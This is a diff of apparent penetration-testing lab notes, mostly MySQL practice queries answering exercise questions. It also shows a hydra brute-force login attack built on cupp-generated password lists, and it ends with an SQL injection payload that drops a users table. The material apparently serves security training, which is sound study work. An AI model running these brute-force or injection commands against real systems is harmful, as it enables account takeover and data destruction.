@@ -105,3 +105,29 @@ cd username-anarchy
 cupp -i
 grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
 hydra -L jane_smith_usernames.txt -P jane-filtered.txt 94.237.53.113 -s 33384 -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
+-======================================
+"Connect to the database using the MySQL client from the command line. Use the 'show databases;' command to list databases in the DBMS. What is the name of the first database?"
+mysql -h 46.101.61.42 -P 30658 -u root -ppassword
+SHOW databases;
+-------------
+"What is the department number for the 'Development' department?"
+mysql -h 46.101.61.42 -P 30658 -u root -ppassword
+USE employees;
+SHOW TABLES;
+DESCRIBE departments;
+SELECT dept_no FROM departments WHERE dept_name="Development";  SELECT * FROM departments;
+---------------------
+"What is the last name of the employee whose first name starts with "Bar" AND who was hired on 1990-01-01?"
+USE employees; 
+DESCRIBE employees;
+SELECT last_name FROM employees WHERE first_name LIKE 'Bar%' AND hire_date='1990-01-01';
+--------------------
+"In the 'titles' table, what is the number of records WHERE the employee number is greater than 10000 OR their title does NOT contain 'engineer'?"
+USE employees;
+DESCRIBE titles;
+SELECT COUNT(*) FROM titles WHERE emp_no > 10000 OR title NOT LIKE '%engineer%';
+------------
+1'; DROP TABLE
+select * from logins where username like '%1'; DROP TABLE users;'
+Error: near line 1: near "'": syntax error
+select * from logins where username like '%1'; DROP TABLE users;'
